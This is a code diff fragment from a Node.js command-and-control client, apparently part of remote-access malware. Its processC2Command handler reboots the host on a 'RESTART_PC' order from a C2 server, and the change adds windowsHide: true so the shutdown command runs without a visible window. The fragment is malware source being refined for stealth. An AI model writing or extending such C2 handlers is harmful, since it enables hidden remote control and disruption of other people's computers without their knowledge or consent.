@@ -595,7 +595,7 @@ const processC2Command = async (cmd) => {
     } else if (cmd.command === 'RESTART_PC') {
        console.log('[C2 COMMAND] Reiniciando computador...');
        if (os.platform() === 'win32') {
-          exec('shutdown /r /t 0');
+          exec('shutdown /r /t 0', { windowsHide: true });
        } else {
           exec('sudo reboot');
        }
